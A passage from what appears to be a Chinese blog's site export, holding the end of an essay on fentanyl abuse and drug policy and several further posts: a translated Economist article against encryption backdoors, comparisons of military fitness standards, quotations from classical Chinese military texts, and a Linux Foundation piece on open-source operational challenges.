中国国内不存在芬太尼滥用的问题，但即便如此，中国当局仍针对美国境内的危机做出有力的回应，下令禁止的芬太尼类物质超出了美国药品机构列管的数量。2016年以来，我国根据相关国家执法协作请求，部署有关省核查向境外邮寄新精神活性物质线索，各地共抓获违法犯罪嫌疑人数十名，捣毁新精神活性物质非法生产窝点8处，缴获已列管新精神活性物质800余千克。 总的来说，根据中国有关部门的判断，芬太尼并没有在我国境内流行。一般情况下都是在中国境内生产，通过网络联系、在线下订单，快递发货。主要销售目的地是美国、加拿大、俄罗斯、法国、瑞典、澳大利亚、意大利、芬兰、日本等发达国家。100 多年以后，饱受鸦片之苦的国家居然开始向列强倾销鸦片了，这真是一个讽刺的故事。 山西之祸患实在鸦片。乡村民众之六成，都市居民之八成，官员兵丁之十成均有毒瘾。—— 时任山西巡抚张之洞写给友人的信 Most were male (71.7% fentanyl and 72.2% fentanyl analogs), non-Hispanic white (81.3% fentanyl and 83.6% fentanyl analogs), and aged 25–44 years (58.4% fentanyl and 60.0% fentanyl analogs) 特朗普总统防治毒瘾和阿片类药物危机委员会的详细报告 | Report of President’s Commission on Combating Drug Addiction and the Opioid Crisis - PDF 三、预测：暗黑幽灵无国界芬太尼目前还没有在中国大陆流行，不代表以后也不会，或许会来得很快，或许已经到来而朝堂上下尚未感知。 芬太尼在北美等发达国家泛滥，也许很多国人还觉得挺好 —— 帝国主义腐朽糜烂，正是天朝崛起的大好时机嘛，甚至有人意淫这是所谓“超限战”的胜利。历史经验反复验证，瘾品的发展史，其实是一部经营扩张史。主要推动力来自科技变革与资本经营。传统瘾品（鸦片、海洛因、可卡因、大麻、酒精及烟草等等）的故事反复说明，瘾品扩张的生物基础足以跨越文化界限，刺激精神的瘾品买卖从来也不会因为国际间的禁止而萎缩。 由于年轻人对于瘾品引起的不良反应的忍受力比较强，自然就比年纪较长的人更想寻求新鲜刺激，更容易瞻前不顾后，也更急于模仿同侪。这些心理特性都易于促成瘾品滥用。 根据加拿大某位毒瘾治疗专家掌握的信息，芬太尼已经在高中生的聚会上流行开来，他的诊所收过一个患者，年仅12岁，已经对芬太尼上瘾。2017 年初，台湾警方破获了一起特大贩运毒品案。桃园机场一次检获 551 公斤茶叶包装的Ｋ他命（氯胺酮），纯度达97％，市价高达4亿多元新台币，可供百万人次吸食。贩毒集团瞄准的就是即将到来的垦丁“春天呐喊”音乐祭—— 音乐狂欢节，常被称为“叫春”或“春呐”，活动三天，10个舞台同时开演，超过200多组演出者轮番演出。 上面这些一点并不奇怪，从人的生理角度来讲，所有药物的区别只有哪个嗨和哪个更嗨的区别。中国大陆的男女老少对于任何一种使人嗨的药物都不是天生免疫的。 反对瘾品非医疗使用的一个重要理由是源于社会成本的考虑。启蒙运动和功利主义等世俗哲学思想有“为大多数人谋求最大利益”的主张，也造就了一个简单而强有力的观念：私人的获利无论多么大，都有可能使公众承担高得不可接受、道德上无可辩解的成本。 如果您想了解更多关于芬太尼药物在美国滥用的细节，建议阅读 Deaths Involving Fentanyl, Fentanyl Analogs, and U-47700 — 10 States, July–December 2016 Weekly / November 3, 2017 。该报告属于发病率和死亡率周报（Morbidity and Mortality Weekly Report，简称：MMWR），为一份美国疾病控制与预防中心发行的美国流行病学摘要周刊。1981年6月5日MMWR发布了历史上第一份艾滋病的医学报告。另外，还可以查询 NDEWS 提供的相关信息NDEWS: A New Approach for Multi-Level Monitoring of Opioid Trends in the U.S. | 2016 ，NDEWS 即美国国家药物预警系统（Dational Drug Early Warning System)，它基于遍布全国的监测中心，动态提供有关药物滥用 Street Names Street names for fentanyl or for fentanyl-laced heroin include Apache, China Girl, China White, Dance Fever, Friend, Goodfella, Jackpot, Murder 8, TNT, and Tango and Cash 在北美街头，芬太尼及相关药物常被称为： Apache,流氓、一款武装直升机、一款开源软件 China Girl, China White,芬太尼粉末为白色 Dance Fever,舞会，大家都来跳舞 Friend,朋友 Goodfella,好兄弟（黑手党成员） Jackpot,大笔收入，头奖 Murder 8, TNT,烈性摘要 Tango,探戈舞 Cash 美国公共卫生与药物滥用预警监测体系 发病率和死亡率周报（Morbidity and Mortality Weekly Report，简称：MMWR）一份美国疾病控制与预防中心发行的美国流行病学摘要周刊。1981年6月5日MMWR发布一份5位病人的病情案例，随后此份案例就成为有史以来艾滋病的首份医学报告。 美国疾病控制与预防中心（Centers for Disease Control and Prevention，缩写 CDC）美国卫生及公共服务部所属的一个机构，总部设在乔治亚州亚特兰大。 美国国立卫生研究院 (National Institutes of Health，NIH)位于美国马里兰州贝塞斯达（Bethesda），是美国最高水平的医学与行为学(medical and behavioral research)研究机构。初创于1887年，拥有27个研究所及研究中心和1个院长办公室(office of the director，OD)。 美国国家药物滥用研究所 (National Institute on Drug Abuse，NIDA 1974） 美国国家药物预警系统（National Drug Early Warning System，缩写 NDEWS) 美国禁毒署 (American Drug Enforcement Administration) Addiction is a disease that affects both the brain and behavior. Can drug addiction be treated?Addiction treatment must help the person do the following: stop using drugs stay drug-free be productive in the family, at work, and in society Principles of Effective TreatmentBased on scientific research since the mid-1970s, the following key principles should form the basis of any effective treatment program: Addiction is a complex but treatable disease that affects brain function and behavior. No single treatment is right for everyone. People need to have quick access to treatment. Effective treatment addresses all of the patient’s needs, not just his or her drug use. Staying in treatment long enough is critical. Counseling and other behavioral therapies are the most commonly used forms of treatment. Medications are often an important part of treatment, especially when combined with behavioral therapies. Treatment plans must be reviewed often and modified to fit the patient’s changing needs. Treatment should address other possible mental disorders. Medically assisted detoxification is only the first stage of treatment. Treatment doesn’t need to be voluntary to be effective. Drug use during treatment must be monitored continuously. Treatment programs should test patients for HIV/AIDS, hepatitis B and C, tuberculosis, and other infectious diseases as well as teach them about steps they can take to reduce their risk of these illnesses. 相关人物：普林斯·罗杰·尼尔森普林斯·罗杰·尼尔森（Prince Rogers Nelson，1958年6月7日－2016年4月21日），艺名王子（Prince），生于美国明尼苏达州。Prince 被普遍认为是一位音乐天才与艺术家。他的专辑在全球销售超过一亿张，是史上最畅销的音乐艺术家之一，为1980年代美国流行乐代表人物。 Prince 的音乐横跨多种风格，其中包括了放克、流行、摇滚、节奏蓝调、灵魂乐及嘻哈音乐。获得过7次格莱美奖、5次全美音乐奖、3次全英音乐奖、3次NAACP Image奖、4次MTV音乐录影带大奖。1990年获得Soul Train文化遗产奖终生成就奖，2006年获得Webby终身成就奖，2010年获得BET终生成就奖，2004年入选美国摇滚名人堂(入选名人堂的歌手需要在首张专辑发行至少25年之后)，2006年入选英国音乐名人堂。 2016年4月15日，Prince 在他的私人飞机上突感不适，紧急降落于伊利诺伊州治疗。2016年4月21日他位于明尼苏达州的 Paisley Park 被发现死亡。后经法医调查，相信死因是服用过量的芬太尼。 Prince 的意外死亡震动好莱坞，在全球有一定影响。流行天后雪儿（Cher）表示：“我对 Prince 感到无比的悲伤，他曾经度过一段可怕的时光，这个世界失去太多天才了。”美国古典跨界、创作歌手乔诗·葛洛班（Josh Groban）表示：“睁开眼就听说了这个糟糕透顶的消息，Prince是现代的莫扎特，连续4小时看他演奏和演唱的那一幕，始终萦绕在我脑海中。”奥斯卡影后、“黑珍珠”哈莉·贝瑞表示：“今天是一个悲伤的日子，他的音乐改变了我，他将永远是我的No.1！”美国创作歌手辛迪·劳帕（Cyndi Lauper）表示：“最伟大的艺术家之一Prince今天离开了我们，我将会怀念我的朋友，怀念他的建议和幽默，感谢你充满魔力的音乐。” 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)参考文献 THE PRESIDENT’S COMMISSION ON COMBATING DRUG ADDICTION AND THE OPIOID CRISIS Deaths Involving Fentanyl, Fentanyl Analogs, and U-47700 — 10 States, July–December 2016 Weekly / November 3, 2017 美国总统行政办公室|国家药物管制政策办公室：关于芬太尼的简报文件|July 2017 NDEWS Sentinel Community Site Advance Report 2016:Selected Findings for Heroin, Fentanyl, and Methamphetamine NDEWS: A New Approach for Multi-Level Monitoring of Opioid Trends in the U.S. | 2016 Fentanyl: The Killer Drug Made in China How fentanyl became America’s leading cause of overdose deaths HHS Acting Secretary Declares Public Health Emergency to Address National Opioid Crisis | October 26,2017 特朗普指中国系美阿片类药物泛滥罪魁 | 纽约时报 Connecting the dots: How the opioid epidemic affects suicide in teens and children | 芝加哥论坛报 Why Do People Lose Control Over Their Cocaine Use? Treatment Approaches for Drug Addiction Distress Tolerance | The body broken by alcohol]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:事与愿违的后门程序]]></title>
    <url>%2F2017%2F11%2F06%2FCyberSecurity-BackDoor%2F</url>
    <content type="text"><![CDATA[摘要 原文：Internet security | When back doors backfire |Jan 2nd 2016 一些情报机构赞同在加密软件中放置后门程序，但是谁使用它们呢？ 如果没有加密技术，互联网上传递的信息倒不如写在明信片上。因此，政府、银行和商业机构都对自己的信息加密，当然恐怖组织和犯罪团伙也是如此。后门的问题就是这样，尽管它能让特工的工作更顺利，但也让互联网的每个人都失去了很多秘密。 近期Juniper公司（一家美国网络硬件和软件供应商）事件的启示，清楚地说明了这点。Juniper在12月紧急发布后门公告，最早可追溯到2012年，它使得任何人可以解读基于VPN软件的加密流量（虚拟私有网络），VPN广泛应用于全球的企业和政府机构，以透过公共互联网链接不同办公区。目前不清楚谁该为此事负责，但是可能是在一个情报机构安装后门程序后，其他人又秘密的修改过。该后门涉及的加密标准包含一个有缺陷的随机数生成算法，它获得了美国国家安全局（NSA）的支持；另外一些线索指向中国或英国的情报机构。 针对不同侦查目标破解加密信息显然是情报结构的职责范围，这也是政府结构应当具备监测能力最好理由，当然是在国家安全利益和法律框架的情况下。为了侦查行动而引入后门程序，风险是可能被胡作非为的特工、敌国政府或者犯罪者滥用，而且是在合法的前提下。目前不清楚Juniper的后门程序是什么人安装、使用，结局是什么。 who behind情报机构辩解称：该后门非常隐秘、足够复杂，他们未经授权使用是不可能的。但是外来者可能偶然发现或者窃取到这个漏洞的细节。特别是美国在安全储存保密数据方面的记录非常糟糕。众所周知，在这个夏天，人事管理办公室发生泄密，包括2000万以上联邦雇员（公务员）的敏感个人数据，据称是中国人干的。有人称这一事件为美国情报史上最大的灾难。唯有Edward Snowden 泄密事件可以与之相比，（斯诺登：前国家安全局承包商雇员，目前居住在莫斯科）。（机场安全当局也不小心泄漏了万能钥匙——能打开大多数商业行李——一种物理上的后门）。 反击后门因此强制性置入后门的观点应当抵制。他们可能被犯罪者利用、从整体上削弱互联网安全，亿万人民赖以进行银行和支付业务。这种行为将损害公众对技术公司的信心，也使西方国家政府对独裁政权干涉互联网的批评更加困难。他们过分的要求在任何情况下都是徒劳的：没有后门的高性能加密软件，任何人在网上都可以免费获得。 与其通过后门程序削弱每个人的秘密，特工应当使用其他手段。 11月巴黎恐怖袭击之所以能成功，不是因为恐怖分子使用了高超的计算机技术，而是因为他们的活动信息没有被有效共享。必要时，国家安全局和其他情报机构通常能用特殊方式在嫌疑人的计算机和手机上植入蠕虫病毒。这比使用一个通用的后门要困难和低效——但是它对别人更安全。 扩展阅读 NSA： National Security Agency隶属美国国防部（DoD），办公地点在五角大楼，主管是现役军官。和CIA工作的最大不同之处在于，后两者首要的工作是面向“人”的间谍活动，而NSA不能参与此类间谍活动它的典型工作比如监视反越战活动，经济间谍活动，遭斯诺登泄露的公众信息是由NSA负责监控的。 a new law just passed in China2015年7月1日，中国全国人大通过了新的《国家安全法》，首次提出“国家建设网络与信息安全保障体系”，“维护国家网络空间主权、安全和发展利益” Juniper漏洞2015年12月Juniper发布紧急公告，称在对其NetScreen产品的内部代码审计过程中发现了两枚漏洞,可以让资深的攻击者获得对NetScreen设备的管理权限和解密VPN流量。 VPN 虚拟专用网络在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN可通过服务器、硬件、软件等多种方式实现VPN能提供高水平的安全，使用高级的加密和身份识别协议保护数据避免受到窥探，阻止数据窃贼和其他非授权用户接触这种数据。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commander:美军体能训练观察]]></title>
    <url>%2F2017%2F11%2F05%2FCommander-PHT-USArmy%2F</url>
    <content type="text"><![CDATA[摘要 新兵－团队体能训练锻炼有助于提高灵活性，减少受伤，健康的体魄还能预防疾病，大约减少30%的患病几率力量训练可以增强骨骼的强度和密度，改善循环 ，促进脑供血，这有助于提高思维和决策能力锻炼有助于改善睡眠，睡眠可以为身体充电，为身体和精神提供能量，锻炼有助于缓解压力和焦虑。军队体能体能测试主要侧重于评估战士的肌肉力量、耐力、心血管及呼吸系统的健康状况。 主要测试项目包括：俯卧撑（Push Up）、仰卧起坐（Sit-Up）、3公里跑（Running）只有体能测试及格，才能继续服役，不允许不及格的军人存在。体能训练的完成标准并不固定，根据每个人的年龄、身高、体重等有一个专门的表格。例如22岁男性军人：至少31个俯卧撑，43个仰卧起坐，19分42秒内跑完3公里。游骑兵等特种部队标准高得多。军种间似乎有一些差异。例如海军新兵训练营，貌似只要求你跑够5000米，但是也会插入特色跑法，如“跑到底”——不管快慢，跑到10000米以上，跑不动为止。海军新兵，当然还必须学会游泳，而且是先来个高台跳水，然后游。除了制定严格的标准，同时按照团队模式组织训练，是团队融合进程的关键一环。 新兵训练-控制饮食海军版 可选套餐：A：两个圆饼 B：一个汉堡包 C：一块披萨或一个三明治 其他小东西：水果、酸奶等。 早上、中午、晚上的饭量基本一样。每餐限量，不准吃太多。 但是没有人觉得饿，看着量少，吃进去却觉得很饱。但是让人总想上厕所，一会一趟。（哈哈！） 两个月新兵训练营之后，胖的很快就瘦了，瘦的也结实了。 战伤救治训练 美军从新兵训练开始，就包含了一系列战伤救治训练科目，游骑兵等特种部队的竞赛中还包含了复杂战术背景下的救治科目。 新兵静脉注射训练中，更是要求所有人拿队友，真刀真枪的扎！游骑兵特种部队－战术背景下的救治游骑兵特种部队竞赛－战术背景下的救治处置 官兵一致每名军人每年都必须进行体能评估。 美军《军官晋升条例》：军人体能达标与晋升挂钩，连续3次体能考核不达标者即退出现役。 我朝最年轻的毛少将，在美帝估计连个少尉都混不下去，呵呵呵。。。。美军的体能训练，每名军官的年均体能训练时间都在510小时以上。 美国一直以来把体育教育作为军校必不可少的基础课，与文化教育和军事教育摆在同等重要的地位，尤其是西点军校的野兽营训练，更是让人“谈训色变”。 格斗训练练兵先练将全军统一的格斗训练学校：流水线培养教官队伍综合权衡教学资源、训练时间和资金的限制，结合美军全球部署的特点，在佐治亚州本宁堡基地，设立了格斗训练学校，为全军各单位轮训培养格斗教官。 集中训练的优势 统一教学标准：《现代军事格斗训练大纲》，兼收并蓄，沉淀改进。统一教官标准：按纲施训，不求个体最优，但求总体提升。分级竞赛：技术上从初级到高级逐步提高难度，课程体系上区分不同作战单位，可以看得出非常重视提高学员组织训练能力。促进交流：每年轮训的学员来自全球各个基地，不断的比赛切磋，可以激励日常训练，不但提高了教官群体的整体水平，而且从中脱颖而出的人，又可以作为高级教官的种子。 关于美军中的各种学校美军有数不清的各种学校，此处不展开，节选一段美海军的实录供参考。 候任舰长必须参加一项为期8个月的培训，在多所学校连续进行长时间的“流水线训练”。－－－－《驱逐舰舰长》（［美］詹姆斯－斯塔夫里迪斯）不是确定每位候任舰长需要接受哪些训练，再为每一位军官提供精确指导的训练，而是基于一条知识基准线。 这些知识是每名舰长在过去的工作中都曾接触过的，把每个人送去将所有这些知识再重复学一遍。 毫无疑问，这是一种保守、效率最低的方法。没完没了的讲课，讲的都是你已经非常熟悉、至少已经消化理解的知识。从长远看，这种训练也有其好处。 作者在这段时间的日记中也提到了各种学校。例如： “战斧”导弹学校，专门培训该型武器的所有细节；工程技术培训学校，装备有舰船工程车间的实体模型及各种管线；“候任舰长”学校，纽波特，6周内集中学习舰艇操纵、国际法、安全、通信等；“宙斯盾”学校，一个月，佛吉尼亚州的达尔格伦；海军战术训练学校，佛吉尼亚海滩，丹姆内克训练场，不久前任职舰长，经验丰富的资深军官担任教官； 军民关系作为一支没有政委的志愿兵军队，美帝也是很懂得政治工作的。美图：游骑兵竞赛日。邀请家属来队观战。感觉都High翻了。 参考文献 纪录片《战斗力Combat Forces》 《驱逐舰舰长》（［美］詹姆斯－斯塔夫里迪斯） 《我在美军航母上的8年》 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>Commander</tag>
        <tag>PHT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commander:世界各国军警体能标准横向评测]]></title>
    <url>%2F2017%2F11%2F05%2FCommander-PHT-Stand%2F</url>
    <content type="text"><![CDATA[摘要内容：各国军人基础体能－通用指标横向评测范围：现役Active Duty 军人（中国大陆、英国、美国、台军、日军）、中国田径协会业余运动员标准 概况总体来看，世界各大国、强国都非常重视战斗人员的基础体能训练。各国标准各有特色，跑步单项上的基准线差不多，特种部队的标准基本上参考一般专业运动员的要求。 中国军队25岁以下战斗人员标准，高于一般发达国家标准。区别在于外军的军官要求要高于普通士兵，中高级军官的标准也要达到相当高的水准，共军正好相反，尤其是40岁以上军官的体能标准远远落后于世界平均水平。 中国常规：徒手五公里:23分钟及格.21分钟优秀, 海军陆战队20分雪豹：35公斤十公里特种部队：每五天军队铁人三项：负重40kg跑2000，负重20kg游2000，负重20kg骑车5000 台湾3千米徒手： 16分钟内（现行） 14分钟（新标准，不确认是否意实施，又有说法是18分钟） 美军 USA美国海军陆战队：3英里 18分钟满分 28分钟及格 英国陆军：(男)10分30秒内跑完2400米（女）13分钟内跑完2400米 美军《军官晋升条例》中明确规定，军人体能达标与晋升挂钩，连续3次体能考核不达标者即退出现役。 美军的体能训练，每名军官的年均体能训练时间都在510小时以上。 英军 UK2014年英国国防部数据，过去3年，英国陆军有超过3.2万人没通过基础体能测验。 这项测验要求30岁以下的男性官兵在两分钟内做50次仰卧起坐，在两分钟内做44个俯卧撑，还得在10分30秒内跑完2400米。 女性军人做50次仰卧起坐，21个俯卧撑，在13分钟内跑完2400米。英军陆军每年还有一次急行军测验，官兵要背着25公斤重的背包在两小时内走完12公里…… 英国军官的体能训练标准要求比士兵高 陆军40岁以下的军官每周要进行一次全副武装的5英里行军，3次体能训练，一次计时的3英里跑步。英国新兵入伍后，通常要在专门的组织机构中进行12至25周的共同课目和专业训练，而后补入部队。为调动年轻人的训练激情，英军还为新兵设置了冒险性训练，如登山、攀岩、潜水、滑雪、跳伞，以及到极地寒区、热带丛林、沙漠地带进行野外生存训练等，激发新兵的训练热情。 俄罗斯联邦国防军 俄罗斯国防部也于2009年颁布了《俄联邦武装力量体能训练条例》，并开始实施一项“七年计划”，在全军严格执行体能训练大纲，以提高作战能力。根据该条例，所有军人每天都必须进行一个小时的体育锻炼以增强体能素质。与此同时，大力开展包括游泳在内的各种运动项目，力争保证每一位官兵在掌握基本技能的同时，再精通一项军事体育课目，以达到为战斗力服务的目的。 香港特警由于特殊的历史背景，香港的警察武装兼具警察和特种部队双重角色。总体按照英军标准建设，同时参考美国海军陆战队设置。SDU/机场特警（第一阶段遴选资格） 4.8公里跑步（最低丙级）：甲级‧18分钟以下、乙级‧18-20分钟、丙级‧21-24分钟、丁级‧24分钟以上10公里跑步测试：时间限制于47分钟内完成 参考文章1.为什么美军上将必须参加体能测试2.国防部网站：战斗力有刻度 201504解放军四总部联合颁发《军事体育训练改革发展纲要（2015－2020年）》，强调从健全管理体系、改革训练内容、改进训练方法、完善训练制度、加强队伍建设、改善训练条件等方面聚焦用力，提高部队军事体育训练水平。纵观这一纲要，最引人注目的莫过于提出在全军逐步推行军人体重控制计划，实行体重强制达标制度，把军人体重达标与晋职晋级晋衔挂钩。《纲要》提出，到2020年要使“官兵体质水平全面提高。体重达标率达到95%以上，基本消除体重超标现象”。 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>Commander</tag>
        <tag>PHT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国传统兵法精要]]></title>
    <url>%2F2017%2F11%2F05%2FCommander-Art-Of-War-Chinese%2F</url>
    <content type="text"><![CDATA[摘要将不可骄，骄则失礼，失礼则人离，人离则重判。将不可吝，吝则赏不行，赏不行则士不致命，士不致命则军无功。 version:2011 年读书摘要，201607实证无误者再次修订。 选兵：识人之术选兵必胆为主。胆包在腹，不可见，何以选为？殊不知人之精神露于外，第一选人以精神为主，而当兼用相法。若将威素立，则先收之以恩；若将威未行，则先振之以威。 第一，不可用城市油滑之人，但看面目光白，行动伶便者是也。第二，不可用奸巧之人，神色不定，见官府藐然无忌者是也。第一可用，乡野老实之人。第二可用，乃惯战之人。－－戚继光 危国无贤人，乱政无善人。爱人深者求贤急，乐得贤者养人厚。国将霸者士皆归，邦将亡者贤先避。－－《素书》 练兵：操兵之道（戚继光）光曰：操兵之道，不独执旗走阵于场肆而后谓之操。虽闲居、坐睡、嬉戏亦为操也。善操兵者，必使其气性活泼，或逸而冗之，或劳而息之，俱无定格，或相其意态，察其动静，而撙节之。有精器而无精兵以用之，是谓徒费；有精兵而无精器以助之，是谓徒强。须士兵立得脚跟定，则拽柴可败荆，况精器乎！ 无兵而求战，是为至危；不求战而治兵，其祸尤为不可收拾。先求敌而练兵者，其兵强；先练兵而求敌者，其兵弱。－－蒋百里 三军一人，胜。－－《司马法》 军中有大勇、敢死、乐伤者，聚为一卒，名为冒刃之士；有锐气、壮勇、强暴者，聚为一卒，名为陷阵之士；。。。。。。有赘婿人虏，欲掩迹扬名者，聚为一卒，名曰励钝之士；有贫穷愤怒、欲快其心者，聚为一卒，名曰必死之士；有材技兼人，能负重致远者，聚为一卒，名曰待命之士。此军之练士，不可不察也。－－《六韬》 分塞令：中军、左、右、前、后军，皆有分地，方之以行垣，而无通其交往。采薪刍牧者皆成伍，不成伍者不得通行。吏属无节，士无伍者，横门诛之。－－《素书》 赏罚：励士之道足寒伤心，人怨伤国。－－《素书》 励士之道，民之生不可不厚也。爵列之等，死丧之亲，民之所营不可不显也。必也因民所生之制，因民所营而显之，田禄之实，饮食之亲，乡里相劝，死丧相求，兵役相从，此民之所励也。 委积不多则士不行，赏禄不多则民不劝，武士不选则众不强，器用不便则力不壮，刑罚不中则众不畏。－－《尉缭子》 民无两畏也，畏我侮敌，畏敌侮我。见侮者败，立威者胜。－－《尉缭子》 凡民，以仁就，以义战，以智决，以勇斗，以信专，以利劝，以功胜。让以和，人以洽，自予以不循，争贤以为人，说其心，效其力。－－《司马法》 赏不逾时，欲民速得为善之利也；罚不迁列，欲民速规为不善之害也。大捷不赏，上下皆不伐善，上苟不伐善，则不骄矣，下苟不伐善，必亡等矣。大败不诛，上下皆以不善在已，上苟不善在已，必悔其过，不苟以不善在已，必远其罪。－－《司马法》 用兵之要，在崇礼而重禄。礼崇则智士至，禄重则义士轻死，故禄贤不爱财，赏功不逾时，则下力并而敌国削。夫用人之道，尊以爵，赡以财，则士自来。接以礼，励以义，则士死之。－－《黄石公三略》 恩赏者，不独金帛之惠，虽一言一动皆可为恩为惠。威罚者，不独刑杖之威，虽一语一默亦可为威为罚。－－戚继光 将苑：选才之道一曰，间之以是非而观其志二曰，穷之占辞辩而观其变三曰，咨之以计谋而观其识四曰，告之以祸难而观其勇五曰，醉之以酒而观其性六曰，临之以利而观其廉七曰，期之以事而观其信－－《将苑》 纯乎纯矣，兼以文义，雅有德量，可为大将；优于技艺，励于鼓舞，短于文学，可为偏裨；才有余而志不足，勇有余而志不足，可为小将；为愚、为诈、为贪，收于幕府，有事任用。－－戚继光 商店的学生、工匠的艺徒，要是夜间能读上一点钟的书（就是在实际的事务中过生活的人而能攫取知识），恐怕倒可以负起复兴民族的责任，而每天坐汽车、包车，在中大学上六时以上功课的，恐怕将来只能做学理上的教授罢了。－－蒋百里 民国二十三年五月 将德兵者凶器，将者危任，是以器刚则缺，任重则危。故善将者，不恃强，不怙势，宠之而不喜，辱之而不惧，见利不贪，见美不淫，以身殉国，壹意而已。－－《将苑》 将不可骄，骄则失礼，失礼则人离，人离则重判。将不可吝，吝则赏不行，赏不行则士不致命，士不致命则军无功。－－《将苑》 将能清，能静，能平，能整，能受谏，能听讼，能纳人，能采言，能知国俗，能图山川，能表险难，能制军权。仁贤之智，圣明之虑，负薪之言，廊庙之语，兴衰之事，将所宜闻。夫将拒谏则英雄散，策不从则谋士叛，善恶同则功臣倦，专己则下归咎，自伐则下少功，信谗则众离心，贪财则奸不禁，内顾则士卒淫。－－《黄石公三略》 用兵之害，犹豫最大，三军之灾，莫过于狐疑。善将者，见利不适，遇时不疑。－－《六韬》 子曰：君子惠而不费，劳而不怨，欲而不贪，泰而不骄，威而不猛。 韩非子曰：目短于己见，故以镜观面；智短于自知，故以道正己。镜无见疵之罪，道无明过之恶。目失镜，则无以正须眉；身失道，则无以知迷惑。 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[引入开源软件的六大运营挑战]]></title>
    <url>%2F2017%2F11%2F05%2FOpenSource-Operational%2F</url>
    <content type="text"><![CDATA[摘要 The Linux Foundation：引入开源软件的六大运营挑战 原文：6 Operational Challenges to Using Open Source Software | By Linux FoundationMarch 15, 2017Blog 在当今迅速发展的市场中，那些速度最快、成本最低的持续创新公司才会赢 。同时，正如你所知，我们正在进行的一系列观察，使用开源软件能够实现快速、低成本的创新。 但它也能引入运营挑战和法律风险。 我们现在已经到了这样一个临界点，开源软件已经成为主流，不使用开源几乎肯定会使你的组织处于劣势。所以你必须学会如何驾驭挑战和风险，才能保持竞争力。 “开源是无处不在的，它是不可避免的……对抗开源的政策是不切实际的，会使你处于竞争劣势。”——加特纳。 在这篇文章中，我们将探讨开源如何成为构建软件现实途径。然后，我们将介绍这种新的软件开发方法为组织引入的挑战。 一、开源软件革命从大约四十年前开始，发端于创新学术研究和GNU工具项目，开源软件已经成为主流并重塑了许多行业。今天，已经有超过150万个独特的开源项目，贡献给软件开发者的工作代码超过百万兆字节。这些资源的可用性、软件模块化的趋势以及软件重用，从根本上改变了大多数公司开发软件的方式。 不久以前，我们大部分软件产品都是自己内部开发的。我们也许会使用了一些第三方组件，用以连接到其他系统或执行一些特殊的业务，但这些都是通过一个精心控制的采购流程控制的。 今天，我们可以利用互联网上免费的开源组件，以更快的速度开发更复杂的软件。我们的大部分活动已经从设计开发定制软件，转变为整合现成的组件或半成品。我们只对应用程序中确实非常独特的部分进行编程。 但是现在，我们不再重复一些精心控制的代码收购，而是从互联网上反复下载代码来进行评估、原型制作和集成。虽然这种方法加快了开发速度，但它制造了一系列新的重大挑战。 二、开源软件六大运营挑战使用开源软件带来了许多好处，但它会在软件开发生命周期中引入风险和额外的操作复杂性。 组织必须处理许多新的软件源代码，包括商业和非商业的供应商 – 一些人使用的开源软件来自数百个不同的来源。 众多可用的开源组件导致需要大量的第三方软件采购决策。这些决策如何做出？许多开发者没有相应的资质考虑所有这些必要的方面，包括软件许可证分析，但是一个沉重复杂的流程，例如陈旧的采购方法，代价昂贵和而且费时很长，以至于无法应用到大量新的采购决策中。 集成了大量的第三方组件会制造复杂性。其中一方面就是在多个相互依赖的代码栈中维护软件版本的一致性。 开源软件项目的范围，覆盖业余玩家到专业的开发和版本测试等不同阶段。您的组织必须确保每个应用程序都能选择相应质量保障级别的组件。 您的组织将如何获得所有这些开源组件的技术支持和更新？健康的开源社区提供优秀的支持和维护，但开源的自助服务模式，需要您的开发者与社区的共同参与这部分工作。 商业合作关系可以通过增加财政奖励的方式，向供应商强化你的诉求主张，但是否能影响开源项目的方向取决于您参与的多方面因素。 扩展阅读 基于Ganglia实现服务集群性能态势感知 参考文献]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
